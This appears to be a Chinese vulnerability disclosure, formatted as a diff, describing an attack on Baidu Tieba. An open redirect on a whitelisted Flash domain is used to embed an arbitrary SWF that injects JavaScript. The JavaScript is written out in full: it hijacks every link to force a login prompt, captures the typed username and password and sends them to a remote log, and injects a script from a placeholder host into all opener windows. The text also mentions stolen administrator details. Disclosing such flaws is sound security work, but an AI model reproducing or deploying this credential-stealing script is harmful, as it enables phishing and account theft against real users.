@@ -1,0 +1,40 @@
+漏洞细节：
+百度X吧发帖允许发送指定白名单URL的FLASH，白名单如下：
+
+flashWhiteList:["<a href="http://www.tudou.com/v/%22,%22http://www.tudou.com/player/playlist.swf?lid=","http://6.cn/","http://player.ku6.com/refer/","http://img.ku6.com/common/V2.0.baidu.swf?vid=","http://tv.mofile.com/cn/xplayer.swf?v=","http://v.blog.sohu.com/fo/v4/","http://v.blog.sohu.com/fo/p4/","http://img.openv.tv/hd/swf/hd_player.swf?pid=","http://www.cnboo.com/flash/player.swf?ids=","http://video.pomoho.com/swf/out_player.swf?flvid=","http://video.cctv.com/flash/cctv_player.swf?VideoID=","http://misc.home.news.cn/video/swf/VideoDisplay.swf?videoSource=","http://mv.baidu.com/export/flashplayer.swf?playlist=","http://mv.baidu.com/export/flashplayer.swf?vid=","http://client.joy.cn/flvplayer/","http://player.youku.com/player.php/sid/","http://you.video.sina.com.cn/api/sinawebApi/outplayrefer.php","http://xiyou.cntv.cn/player/OTvideoplayer.swf","http://player.youku.com/player.php","http://player.video.qiyi.com/">http://www.tudou.com/v/","http://www.tudou.com/player/playlist.swf?lid=","http://6.cn/","http://player.ku6.com/refer/","http://img.ku6.com/common/V2.0.baidu.swf?vid=","http://tv.mofile.com/cn/xplayer.swf?v=","http://v.blog.sohu.com/fo/v4/","http://v.blog.sohu.com/fo/p4/","http://img.openv.tv/hd/swf/hd_player.swf?pid=","http://www.cnboo.com/flash/player.swf?ids=","http://video.pomoho.com/swf/out_player.swf?flvid=","http://video.cctv.com/flash/cctv_player.swf?VideoID=","http://misc.home.news.cn/video/swf/VideoDisplay.swf?videoSource=","http://mv.baidu.com/export/flashplayer.swf?playlist=","http://mv.baidu.com/export/flashplayer.swf?vid=","http://client.joy.cn/flvplayer/","http://player.youku.com/player.php/sid/","http://you.video.sina.com.cn/api/sinawebApi/outplayrefer.php","http://xiyou.cntv.cn/player/OTvideoplayer.swf","http://player.youku.com/player.php","http://player.video.qiyi.com/"]
+黑客只需要在白名单URL中找到一个可以嵌入FLASH的漏洞，原白名单http://6.cn/的URL过于宽松，于是在http://6.cn上找到一个301，302状态的转跳URL即可嵌入任意的FLASH文件，如：
+
+http://6.cn/logout.php?next_action=http://xxxxxx/xxxx.swf
+
+该FLASH的功能是在当前页面嵌入一个js，同时在有关联关系的引用窗口跨页面嵌入一个js，也就是在x吧浏览过的网页都能被自动嵌入js。该JS脚本的功能是劫持用户的点击，强制用户登录，并记录用户输入的密码！
+部分代码如下：
+1.劫持网页所有的链接，强制弹出登录框
+for(i=0;i<document.links.length;i++){
+document.links.onclick=function(){
+   TbUtil.login(); //x吧自带的登录函数，弹出登录框层。
+   return false;
+}
+}
+2.劫持登录框的输入，取到用户输入的用户名和密码，并偷偷发送到远程。
+document.onkeyup=function(){
+document.forms['PassFormlogin'].onsubmit=function(){
+   pwd = this.PassInputUsername0.value + '' + this.PassInputPassword0.value;
+   log(escape(pwd));
+}
+}
+复制代码
+
+3.跨页面劫持窗口
+function i_(){
+with(document){getElementsByTagName('head')[0].appendChild(createElement('script')).src='http://xxx/xxx.js';
+}
+}i_()
+
+w_=window;
+while(w_=w_.opener){
+try{
+   w_.eval(i_.toString()+'i_()')
+}catch(e){}
+}
+盗取的管理员的细节：
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
